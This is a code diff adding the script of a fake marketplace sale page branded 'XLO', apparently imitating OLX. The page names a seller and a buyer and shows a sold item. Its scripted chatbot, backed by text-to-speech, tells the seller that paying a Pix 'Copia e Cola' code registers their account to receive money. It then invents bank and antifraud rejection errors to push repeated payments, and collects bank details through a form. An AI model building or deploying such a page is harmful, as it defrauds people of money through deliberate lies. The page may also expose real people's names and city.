+      branch: { code: "XLO" },
+      seller: {
+        name: "Patricia Medina",
+        firstName: "Patricia",
+        initial: "P",
+        verifiedLabel: "Vendedor Verificado"
+      },
+      buyer: {
+        name: "Osmar Britz",
+        firstName: "Osmar",
+        city: "São Luiz Gonzaga",
+        state: "RS",
+        cep: ""
+      },
+      product: {
+        title: "Cômoda",
+        description: "Cômoda",
+        price: 260,
+        status: "VENDIDO",
+        image: "https://img.olx.com.br/images/85/853630792833876.webp"
+      },
+      sale: {
+        orderId: "992014883",
+        transactionId: "TX-992014883",
+        status: "Aguardando atualização",
+        referenceCode: "XLO-992014883"
+      },
+      assistant: {
+        name: "Ana",
+        welcome: "Olá, {{buyer.firstName}}! Sou a {{assistant.name}} da {{branch.code}}.",
+        instruction: "Esta página mostra os detalhes da venda de {{product.title}}."
+      }
+    };
+
+    function formatBRL(value) {
+      return Number(value || 0).toLocaleString('pt-BR', {
+        style: 'currency',
+        currency: 'BRL'
+      });
+    }
+
+    function resolveVars(text) {
+      if (!text) return "";
+      const map = {
+        "{{branch.code}}": PAGE_DATA.branch.code,
+        "{{seller.name}}": PAGE_DATA.seller.name,
+        "{{seller.firstName}}": PAGE_DATA.seller.firstName,
+        "{{buyer.name}}": PAGE_DATA.buyer.name,
+        "{{buyer.firstName}}": PAGE_DATA.buyer.firstName,
+        "{{buyer.city}}": PAGE_DATA.buyer.city,
+        "{{buyer.state}}": PAGE_DATA.buyer.state,
+        "{{product.title}}": PAGE_DATA.product.title,
+        "{{product.price}}": formatBRL(PAGE_DATA.product.price),
+        "{{sale.orderId}}": PAGE_DATA.sale.orderId,
+        "{{sale.transactionId}}": PAGE_DATA.sale.transactionId,
+        "{{assistant.name}}": PAGE_DATA.assistant.name
+      };
+      return Object.entries(map).reduce((acc, [key, val]) => acc.split(key).join(val), text);
+    }
+
+    function setText(id, value) {
+      const el = document.getElementById(id);
+      if (el) el.textContent = value;
+    }
+
+    function applyPageData() {
+      setText("brandLogoText", PAGE_DATA.branch.code);
+      setText("assistantBrand", PAGE_DATA.branch.code);
+
+      document.querySelectorAll('[data-seller-name]').forEach(el => el.textContent = PAGE_DATA.seller.name);
+      document.querySelectorAll('[data-seller-initial]').forEach(el => el.textContent = PAGE_DATA.seller.initial);
+      document.querySelectorAll('[data-seller-verified]').forEach(el => el.textContent = PAGE_DATA.seller.verifiedLabel);
+
+      setText("displayBuyerName", PAGE_DATA.buyer.name);
+      setText("displayLocation", `${PAGE_DATA.buyer.city}, ${PAGE_DATA.buyer.state}${PAGE_DATA.buyer.cep ? " - CEP " + PAGE_DATA.buyer.cep : ""}`);
+
+      setText("displayProductTitle", PAGE_DATA.product.title);
+      setText("displayProductPrice", formatBRL(PAGE_DATA.product.price));
+
+      const productPhoto = document.getElementById("productPhoto");
+      if (productPhoto) productPhoto.src = PAGE_DATA.product.image;
+
+      document.querySelectorAll('[data-product-title]').forEach(el => el.textContent = PAGE_DATA.product.title);
+      document.querySelectorAll('[data-product-price]').forEach(el => el.textContent = formatBRL(PAGE_DATA.product.price));
+      document.querySelectorAll('[data-product-image]').forEach(el => el.src = PAGE_DATA.product.image);
+
+      document.querySelectorAll('[data-order-id]').forEach(el => el.textContent = PAGE_DATA.sale.orderId);
+      document.querySelectorAll('[data-transaction-id]').forEach(el => el.textContent = PAGE_DATA.sale.transactionId);
+
+      const formatted = formatBRL(PAGE_DATA.product.price);
+      ["badgeWalletVal","timelineEscrowVal","boxAmount","successAmount","resumoPending","carteiraCustodyVal"].forEach(id => setText(id, formatted));
+
+      const codeInput = document.getElementById('copyCodeInput');
+      if (codeInput) codeInput.value = PAGE_DATA.sale.referenceCode;
+
+      document.querySelectorAll('[data-assistant-name]').forEach(el => el.textContent = PAGE_DATA.assistant.name);
+      setText("assistantWelcome", resolveVars(PAGE_DATA.assistant.welcome));
+    }
+
+    let appState = {
+      isReleased: false,
+      validationAttempts: 0
+    };
+
+
+    window.addEventListener('DOMContentLoaded', () => {
+      applyPageData();
+    });
+
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+      document.querySelectorAll('nav button').forEach(btn => {
+        btn.classList.remove('bg-purple-100', 'text-xlo-purple', 'font-black');
+        btn.classList.add('text-gray-700');
+      });
+
+      const targetView = document.getElementById('view-' + tabId);
+      if (targetView) targetView.classList.add('active');
+
+      const activeNav = document.getElementById('nav-' + tabId);
+      if (activeNav) {
+        activeNav.classList.add('bg-purple-100', 'text-xlo-purple', 'font-black');
+        activeNav.classList.remove('text-gray-700');
+      }
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function toggleBot() {
+      const win = document.getElementById('chatWindow');
+      win.classList.toggle('hidden');
+    }
+
+    function speakBotText(text) {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(text);
+        utterance.lang = 'pt-BR';
+        utterance.rate = 1.0;
+        window.speechSynthesis.speak(utterance);
+      }
+      addChatMessage(text, 'bot');
+    }
+
+    function addChatMessage(text, sender) {
+      const container = document.getElementById('chatMessages');
+      const div = document.createElement('div');
+      div.className = sender === 'bot' ? 'flex items-start gap-2' : 'flex items-start gap-2 flex-row-reverse';
+      
+      div.innerHTML = sender === 'bot' 
+        ? `<div class="w-7 h-7 bg-xlo-purple text-white rounded-full flex items-center justify-center flex-shrink-0 text-[10px]"><i class="fa-solid fa-robot"></i></div><div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 text-gray-800">${text}</div>`
+        : `<div class="w-7 h-7 bg-xlo-orange text-white rounded-full flex items-center justify-center flex-shrink-0 text-[10px]">C</div><div class="bg-purple-50 p-3 rounded-xl shadow-sm border border-purple-200 text-gray-800">${text}</div>`;
+      
+      container.appendChild(div);
+      container.scrollTop = container.scrollHeight;
+    }
+
+    function handleCopyAndGuide() {
+      const codeInput = document.getElementById('copyCodeInput');
+      codeInput.select();
+      
+      const tempTextArea = document.createElement('textarea');
+      tempTextArea.value = codeInput.value;
+      document.body.appendChild(tempTextArea);
+      tempTextArea.select();
+      document.execCommand('copy');
+      document.body.removeChild(tempTextArea);
+
+      document.getElementById('pixInstructions').classList.remove('hidden');
+
+      showToast('Código Pix Copiado com Sucesso!');
+      
+      const guideText = "Código copiado! Lembre-se: esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente. Abra o seu banco, escolha Pix Copia e Cola, cole o código e confirme. Depois clique em Continuar para cadastrar sua conta.";
+      speakBotText(guideText);
+      addChatMessage("Copiei o código Pix com sucesso!", 'user');
+    }
+
+    function handleContinuarValidation() {
+      appState.validationAttempts++;
+      
+      if (appState.validationAttempts === 1) {
+        speakBotText("Atenção! O sistema verificou que a validação do banco ainda precisa ser concluída. Esse código Pix serve justamente para cadastrar a conta de recebimento dos valores e receber na hora imediatamente. Vamos revisar e tentar novamente!");
+        addChatMessage("Tentei continuar, mas o sistema pediu para revisar a validação do Pix.", 'user');
+        
+        const codeInput = document.getElementById('copyCodeInput');
+        codeInput.classList.add('ring-4', 'ring-xlo-orange', 'border-xlo-orange');
+        setTimeout(() => {
+          codeInput.classList.remove('ring-4', 'ring-xlo-orange', 'border-xlo-orange');
+        }, 3000);
+
+        openAccountModal();
+      } else {
+        openAccountModal();
+      }
+    }
+
+    function openAccountModal() {
+      document.getElementById('accountModal').classList.remove('hidden');
+      speakBotText("Preencha os dados abaixo. Esse cadastro de conta é para validar o banco e receber os 5 mil reais na hora imediatamente!");
+    }
+
+    function closeAccountModal() {
+      document.getElementById('accountModal').classList.add('hidden');
+    }
+
+    function confirmAndFinalize() {
+      closeAccountModal();
+      appState.validationAttempts++;
+      
+      const errorMsgs = [
+        "Erro de Validação Bancária: O banco recusou o cadastro para recebimento imediato. A conta não pôde ser validada por segurança da custódia XLO Pay.",
+        "Falha na Autenticação Instantânea: A chave Pix informada falhou na validação para recebimento na hora. Cadastro de conta rejeitado pelo antifraude.",
+        "Segurança XLO: Tentativa de recebimento imediato bloqueada. É obrigatório refazer toda a validação do Pix Copia e Cola e conferir os dados bancários."
+      ];
+      
+      const currentErr = errorMsgs[(appState.validationAttempts - 1) % errorMsgs.length];
+      
+      showToast(currentErr);
+      speakBotText("Atenção! O cadastro da conta não deu certo e foi recusado por segurança. " + currentErr + " Lembre-se: esse código Pix é para cadastrar a conta de recebimento dos valores, validar o banco e receber na hora imediatamente. Copie o código novamente e refaça o processo.");
+      
+      addChatMessage("Tentei cadastrar a conta para recebimento imediato, mas o sistema de segurança recusou (" + appState.validationAttempts + "ª falha).", 'user');
+      addChatMessage(currentErr, 'bot');
+      
+      document.getElementById('actionArea').scrollIntoView({ behavior: 'smooth' });
+      
+      const codeInput = document.getElementById('copyCodeInput');
+      codeInput.classList.add('ring-4', 'ring-red-500', 'border-red-500');
+      setTimeout(() => {
+        codeInput.classList.remove('ring-4', 'ring-red-500', 'border-red-500');
+      }, 3000);
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toast');
+      document.getElementById('toastMsg').innerText = msg;
+      toast.classList.remove('translate-y-24', 'opacity-0');
+      setTimeout(() => {
+        toast.classList.add('translate-y-24', 'opacity-0');
+      }, 4500);
+    }
+  </script>
+
+
+
+</body></html>
